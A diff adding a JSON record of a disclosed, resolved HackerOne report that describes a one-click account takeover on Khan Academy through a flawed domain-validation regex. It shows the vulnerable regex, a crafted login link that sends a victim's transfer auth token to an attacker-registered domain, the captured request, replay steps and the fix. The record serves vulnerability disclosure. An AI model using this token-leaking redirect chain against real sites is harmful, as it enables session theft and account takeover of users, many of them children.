@@ -1,0 +1,148 @@
+{
+  "id": 3723458,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzIzNDU4",
+  "url": "https://hackerone.com/reports/3723458",
+  "title": "1-Click Account Takeover via Open Redirect through Regex Bypass in Domain Validation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-09T18:25:55.802Z",
+  "submitted_at": "2026-05-09T18:25:56.181Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "farr",
+    "url": "/farr",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 134,
+    "url": "https://hackerone.com/khanacademy",
+    "handle": "khanacademy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Khan Academy",
+      "twitter_handle": "",
+      "website": "https://www.khanacademy.org/",
+      "about": "Start learning now. Completely free, forever."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-06-20T15:58:07.357Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-05-21T15:58:03.235Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "# Summary \n\nHello there,\n\nDuring my security research, I identified a critical vulnerability chain that allows an attacker to achieve full account takeover of any Khan Academy user. The attack exploits an unescaped dot flaw in the `KA_DOMAIN_REGEX` regular expression used to validate redirect URLs, combined with the transfer auth token mechanism used in the cross-domain authentication. \n\nWhen a user is redirected to a different Khan Academy subdomain after login, the application generates a one-time transfer auth token and passes it in the URL. By exploiting the regex flaw, an attacker can register a domain that passes the validation check, causing the victim's transfer auth token to be sent to an attacker-controlled server. The attacker then replays this token on any legitimate Khan Academy domain to obtain a full session (KAAS, KAAL, KAAC cookies) as the victim.\n\n# Root Cause\n\nWhen investigating common parameters used in the khanacademy.org apex domain, I noticed the parameter `continue` triggered a cross-domain authentication. Essentially, it initiates this custom authentication by generating a temporary auth token that can be reconstructed on the cross-domain to establish the same session, on the new domain. \n\nWhen testing it out, I noticed the url that I passed in `continue` was subjected to a regex that only allowed specific URLs to be used. \n\nBy leaking the map source from `https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map`, I was able to identify the frontend source code at `libs/urls/src/regexp.ts` which was responsible to validate what URLs were trusted or not. Effectively, this is the current implementation:\n\n```javascript\nKA_DOMAIN_REGEX = /(^|\\.)(khanacademy\\.(org|dev|test|local)|kastatic\\.org|.*-6fmjyrz2lq-uc.a.run.app)$/\n```\n\nAlthough at first look, the regex seems correct, it is not really robust. The issue is that dots between `uc`, `a`, `run`, and `app` are **not escaped**, meaning it could be any character, not necessarily a dot (`.`).\n\nWith this in mind, I tested for the following subdomain `xfarr-6fmjyrz2lq-uc-a-run.app`(which I ended up registering myself for this PoC) and a successful Open Redirect was validated.\n\n```\nIntended:   legitimate-service-6fmjyrz2lq-uc.a.run.app    ✓ matches (Legit Cloud Run service)\nUnintended: xfarr-6fmjyrz2lq-uc-a-run.app    ✓ matches (Attacker-controlled)\n```\n\nTo escalate this vulnerability to a P0, the attacker can lure the victims to click the malicious link: \n`https://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F` (Though it can be any domain that uses this feature in the *.khanacademy.org domain).\n\nThe victim accesses the `classroom.khanacademy.org`, which initiates the cross-domain authentication mechanism, consequentially being redirected to the malicious server `xfarr-6fmjyrz2lq-uc-a-run.app` leaking the Auth Token. \n\nAt this point, the attacker can take the auth token and establish the session in any of the *.khanacademy.org domains as the victim.\n\n# PoC\n\n## Step 1 - Attacker registers a matching domain\n\nThe attacker registers a domain xfarr-6fmjyrz2lq-uc-a-run.app. For this proof of concept, I registered:\n\n```\nxfarr-6fmjyrz2lq-uc-a-run.app\n```\n\n{F5885451}\n\nThis domain passes `KA_DOMAIN_REGEX.test()` because the unescaped dots match the hyphens. \n\n## Step 2 - Attacker sets up an HTTPS listener and crafts a phishing link\n\nThe attacker sets up a simple HTTPS server on this domain to capture incoming requests.\n\n{F5885456}\n\nThe attacker constructs a link that triggers the cross-domain redirect flow:\n\n```\nhttps://classroom.khanacademy.org/login?continue=https%3A%2F%2Fxfarr-6fmjyrz2lq-uc-a-run.app%2F\n```\n\nThis link can be delivered via email, embedded in a classroom assignment, shared in the Discourse forum, or sent through any other communication channel.\n\n## Step 3 - Victim clicks the link\n\nWhen the victim (who is already logged in, or logs in) clicks the link:\n\n1. The Khan Academy SPA loads on `classroom.khanacademy.org` (though the scope is *.khanacademy.org).\n\n2. The `calculateNextUrl` pipeline processes the `continue` parameter\n\n3. `isKhanAcademyUrl()` validates the redirect URL against `KA_DOMAIN_REGEX`\n\n4. Since the destination hostname (`xfarr-6fmjyrz2lq-uc-a-run.app`) differs from the current hostname (`classroom.khanacademy.org`), the `maybeAddAuthTransfer()` function is triggered\n\n5. The function calls `createTransferAuthTokenMutation`, which generates a **one-time transfer auth token** tied to the victim's session\n\n6. The function constructs a redirect URL: `https://xfarr-6fmjyrz2lq-uc-a-run.app/transfer_auth?key=<TOKEN>&continue=/`\n\n7. The victim's browser is redirected to the attacker's server\n\nThe victim perspective sees a 404:\n{F5885466}\n\nBut on the attacker-controlled server the auth token is leaked:\n\n████████\n\n## Step 4 - Attacker captures the token\n\nThe attacker's server receives the HTTP request containing the victim's transfer auth token in the URL:\n\n```\nGET /transfer_auth?key=<TOKEN?>&continue=/ HTTP/1.1\nHost: xfarr-6fmjyrz2lq-uc-a-run.app\n```\n\nThe attacker's server extracts the `key` parameter value. The token is not consumed at this point because the Khan Academy JavaScript (which calls `transferAuthMutation` to consume the token) does not run on the attacker's domain. The token remains valid in Khan Academy's backend database.\n\nThe attacker will then use this token as a replay attack.\n\n## Step 5 - Attacker replays the token\n\nThe attacker opens their browser (I am using incognito for the PoC), which will trigger the authentication and complete the Account Takeover.\n\nOn this legitimate Khan Academy domain:\n\n1. The SPA loads and reads the `?key=TOKEN` parameter from the URL\n\n2. The JavaScript calls `transferAuthMutation`, sending the token to the Go backend\n\n3. The backend validates the token against its database, identifies the victim's user account\n\n4. The backend responds with `Set-Cookie` headers, issuing a full set of authentication cookies:\n   - `KAAS`: long-lived session cookie\n   - `KAAL`: short-lived access cookie (contains the user's KAID)\n   - `KAAC`: access control context cookie\n   - `reauth_token`: re-authentication token\n\n5. The attacker's browser is now fully authenticated as the victim\n\n████████\n\n## Impact\n\n# Impact\n\nThis vulnerability allows any attacker to achieve full account takeover of any Khan Academy user, including teachers, students, parents, and district administrators, with a single click from the victim.\n\nThe attacker gains complete access to:\n\n- Personal information: email, birthdate, profile data\n- Student data: classroom rosters with student emails and KAIDs, progress reports, assignment scores\n- Teaching materials: Khanmigo AI-generated documents, lesson plans, chunked text resources\n- AI conversation history: private Khanmigo/AI Guide transcripts\n- Account settings: ability to modify nickname, language, email preferences\n- Classroom management: ability to rename classrooms, modify courses, manage students\n- District administration: for district admin accounts, access to school/district management\n\nSince Khan Academy is an educational platform used by millions of students, many of whom are minors, unauthorized access to teacher and student accounts carries particularly severe privacy implications under regulations such as COPPA and FERPA.\n\n# Recommended Fix\n\n## Escape the dots in the regex\n\nChange:\n```javascript\nKA_DOMAIN_REGEX = /(^|\\.)(khanacademy\\.(org|dev|test|local)|kastatic\\.org|.*-6fmjyrz2lq-uc.a.run.app)$/\n```\n\nTo:\n```javascript\nKA_DOMAIN_REGEX = /(^|\\.)(khanacademy\\.(org|dev|test|local)|kastatic\\.org|.*-6fmjyrz2lq-uc\\.a\\.run\\.app)$/\n```\n\nThis ensures only literal dots match, preventing `.app` TLD domains from passing validation. The authentication itself is not the main issue, as it is leveraged by this small bug.\n\nAdditionally, part of the code analysis was immensely facilitated by having discovered the map file associated with the vulnerable function (`https://cdn.kastatic.org/khanacademy/khanacademy.<hash>.js.map`). Although this is not a vulnerability by itself, it is recommended to not include in production environments.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5885451,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/s7zsipcthoxvygt8ami71afsvjla?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUZB6EEAE%2F20260620%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260620T163400Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJIMEYCIQCPdCQVO1jtOof25A%2FfFJ47lJb31nmArPTtNkDLFLayfgIhAJDQiLgiYkIbQe4sCvF1HrAapym%2Bx8JLlTi9GrGYDvNYKrsFCNj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzdbu0V3Lcm3K2PIMkqjwUi5tusCNytqoE3ykm9OZCZVmvaqgDwQwhZxPSPZl0duK%2FiZ1lqSi9hKV5ebqq%2BDa5LECpchDk4RqVxKiW6YsWgrVs4v2gcMNsI5mGPN6NJLShRQOExsMPKRwAbapheqn%2FsstGapVOJwdvNKX5IT%2FgDAfDdGuWtFRnqq0HbTdot4j5Y9yIP5drsiVhk9B2fub9unK%2FpJNNVYi316SL61c0QGp3r95TG%2FpGN%2FV1FiTvM27XUQJFsWAt5YHqaSzEnsbIGnyxOuPioIyX2CoBZT4SHZtksLuunss5pROWL%2BdmTM5ljw8Ez04Y%2FtlAY%2FRkg7bxyUDYRaAf70Abj21TCtTs5ULWBRj9hF1CmYN7qriaUgHyb4ZLUfigp9ZVn6SQIwI%2Bnf4BuZIISXuv22OF%2Be84nkTl8K9zU1pSsoI7GXLNVlYkhIu0stmJvKkoc0aFPBvVDfF089po8CsYz%2BYaobqtv26cU8eBF25EY%2BYQqVocIH0nwMthS0AI%2FsD24ugEf7ac%2BzZOeKNZj%2FTMVtaje03pQj%2F0p8R%2BtRVQ%2FPQ3nKkEGJQbOv7XzhB7ZJXI6vNHmtmuTOTQTdzkhyrHrOGNmr23Pg8BE8YLoNgqS2O0uzMGOzoWDuLBxyk6my2TWYSWBDvOPEnArA8BWjAJMGMZIHkIxviXoNjB%2FQ43CywqbfMSv5ZOijTYINhQjWWNlefHhzdXTLI0%2FZ%2B8LbeEwhNCv7tlrHQgi4r9hcc0G5JBigOmjekSb5LPc0DwclrJ7KjDtnkkrYiUxy8OM06cNhQ8q02yo2an9Srnqnf8VJdfmK4TOEseFueqXsS6wYas4XFlqFX%2BwrwBej17ouQJU19uMsaKmlnSLAoSmuYYc8HJ%2FuYnJMI%2FV2tEGOrABwEUtBwT8ExhI6fmgsqD3Fk1c6TCMEgMeqf7hKBdQifPyeLRrBeEQzGFx0%2BO7uESfak3XFcRo%2BRy6obT50xpFYhANzuNCGABOUGHMAprysBe32AB6i5%2Buh%2F%2BnodK8EIsJL0NdZR02QXCQ%2B4pCbEsJ7c9gDm%2Fd9DIqp8DUoFNXkjcUyOSj1XHHffczgi3Z5Tnt1foFLedc5NE8TgCCl%2FnUoiGMiobgKpjPtFCKldT0SgI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=68b79b8566a7a8f3ce5e5a0f36a540943eebc853ab31cb7f164e605d103a5d43",
+      "file_size": 57976,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5885456,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9xwzy0b3htgctgkpzbgpteyv6n6x?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUZB6EEAE%2F20260620%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260620T163400Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJIMEYCIQCPdCQVO1jtOof25A%2FfFJ47lJb31nmArPTtNkDLFLayfgIhAJDQiLgiYkIbQe4sCvF1HrAapym%2Bx8JLlTi9GrGYDvNYKrsFCNj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzdbu0V3Lcm3K2PIMkqjwUi5tusCNytqoE3ykm9OZCZVmvaqgDwQwhZxPSPZl0duK%2FiZ1lqSi9hKV5ebqq%2BDa5LECpchDk4RqVxKiW6YsWgrVs4v2gcMNsI5mGPN6NJLShRQOExsMPKRwAbapheqn%2FsstGapVOJwdvNKX5IT%2FgDAfDdGuWtFRnqq0HbTdot4j5Y9yIP5drsiVhk9B2fub9unK%2FpJNNVYi316SL61c0QGp3r95TG%2FpGN%2FV1FiTvM27XUQJFsWAt5YHqaSzEnsbIGnyxOuPioIyX2CoBZT4SHZtksLuunss5pROWL%2BdmTM5ljw8Ez04Y%2FtlAY%2FRkg7bxyUDYRaAf70Abj21TCtTs5ULWBRj9hF1CmYN7qriaUgHyb4ZLUfigp9ZVn6SQIwI%2Bnf4BuZIISXuv22OF%2Be84nkTl8K9zU1pSsoI7GXLNVlYkhIu0stmJvKkoc0aFPBvVDfF089po8CsYz%2BYaobqtv26cU8eBF25EY%2BYQqVocIH0nwMthS0AI%2FsD24ugEf7ac%2BzZOeKNZj%2FTMVtaje03pQj%2F0p8R%2BtRVQ%2FPQ3nKkEGJQbOv7XzhB7ZJXI6vNHmtmuTOTQTdzkhyrHrOGNmr23Pg8BE8YLoNgqS2O0uzMGOzoWDuLBxyk6my2TWYSWBDvOPEnArA8BWjAJMGMZIHkIxviXoNjB%2FQ43CywqbfMSv5ZOijTYINhQjWWNlefHhzdXTLI0%2FZ%2B8LbeEwhNCv7tlrHQgi4r9hcc0G5JBigOmjekSb5LPc0DwclrJ7KjDtnkkrYiUxy8OM06cNhQ8q02yo2an9Srnqnf8VJdfmK4TOEseFueqXsS6wYas4XFlqFX%2BwrwBej17ouQJU19uMsaKmlnSLAoSmuYYc8HJ%2FuYnJMI%2FV2tEGOrABwEUtBwT8ExhI6fmgsqD3Fk1c6TCMEgMeqf7hKBdQifPyeLRrBeEQzGFx0%2BO7uESfak3XFcRo%2BRy6obT50xpFYhANzuNCGABOUGHMAprysBe32AB6i5%2Buh%2F%2BnodK8EIsJL0NdZR02QXCQ%2B4pCbEsJ7c9gDm%2Fd9DIqp8DUoFNXkjcUyOSj1XHHffczgi3Z5Tnt1foFLedc5NE8TgCCl%2FnUoiGMiobgKpjPtFCKldT0SgI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e07b44e3ba8dcc71e75d07da299d75fbd7d3289ea7c03e014af233050ed6606f",
+      "file_size": 59844,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 5885466,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yfwkpzolx7kc2qod6edpgb1mznk4?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUZB6EEAE%2F20260620%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260620T163400Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEA8aCXVzLXdlc3QtMiJIMEYCIQCPdCQVO1jtOof25A%2FfFJ47lJb31nmArPTtNkDLFLayfgIhAJDQiLgiYkIbQe4sCvF1HrAapym%2Bx8JLlTi9GrGYDvNYKrsFCNj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5Igzdbu0V3Lcm3K2PIMkqjwUi5tusCNytqoE3ykm9OZCZVmvaqgDwQwhZxPSPZl0duK%2FiZ1lqSi9hKV5ebqq%2BDa5LECpchDk4RqVxKiW6YsWgrVs4v2gcMNsI5mGPN6NJLShRQOExsMPKRwAbapheqn%2FsstGapVOJwdvNKX5IT%2FgDAfDdGuWtFRnqq0HbTdot4j5Y9yIP5drsiVhk9B2fub9unK%2FpJNNVYi316SL61c0QGp3r95TG%2FpGN%2FV1FiTvM27XUQJFsWAt5YHqaSzEnsbIGnyxOuPioIyX2CoBZT4SHZtksLuunss5pROWL%2BdmTM5ljw8Ez04Y%2FtlAY%2FRkg7bxyUDYRaAf70Abj21TCtTs5ULWBRj9hF1CmYN7qriaUgHyb4ZLUfigp9ZVn6SQIwI%2Bnf4BuZIISXuv22OF%2Be84nkTl8K9zU1pSsoI7GXLNVlYkhIu0stmJvKkoc0aFPBvVDfF089po8CsYz%2BYaobqtv26cU8eBF25EY%2BYQqVocIH0nwMthS0AI%2FsD24ugEf7ac%2BzZOeKNZj%2FTMVtaje03pQj%2F0p8R%2BtRVQ%2FPQ3nKkEGJQbOv7XzhB7ZJXI6vNHmtmuTOTQTdzkhyrHrOGNmr23Pg8BE8YLoNgqS2O0uzMGOzoWDuLBxyk6my2TWYSWBDvOPEnArA8BWjAJMGMZIHkIxviXoNjB%2FQ43CywqbfMSv5ZOijTYINhQjWWNlefHhzdXTLI0%2FZ%2B8LbeEwhNCv7tlrHQgi4r9hcc0G5JBigOmjekSb5LPc0DwclrJ7KjDtnkkrYiUxy8OM06cNhQ8q02yo2an9Srnqnf8VJdfmK4TOEseFueqXsS6wYas4XFlqFX%2BwrwBej17ouQJU19uMsaKmlnSLAoSmuYYc8HJ%2FuYnJMI%2FV2tEGOrABwEUtBwT8ExhI6fmgsqD3Fk1c6TCMEgMeqf7hKBdQifPyeLRrBeEQzGFx0%2BO7uESfak3XFcRo%2BRy6obT50xpFYhANzuNCGABOUGHMAprysBe32AB6i5%2Buh%2F%2BnodK8EIsJL0NdZR02QXCQ%2B4pCbEsJ7c9gDm%2Fd9DIqp8DUoFNXkjcUyOSj1XHHffczgi3Z5Tnt1foFLedc5NE8TgCCl%2FnUoiGMiobgKpjPtFCKldT0SgI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4e07a29929d2fc1b0dc55e871cc4f851a9a14c31c3195f920e514e1c8febd163",
+      "file_size": 49579,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-06-20T15:58:03.416Z",
+  "allow_singular_disclosure_after": -2157.583152415,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "farr",
+    "2026",
+    "aa22qq"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
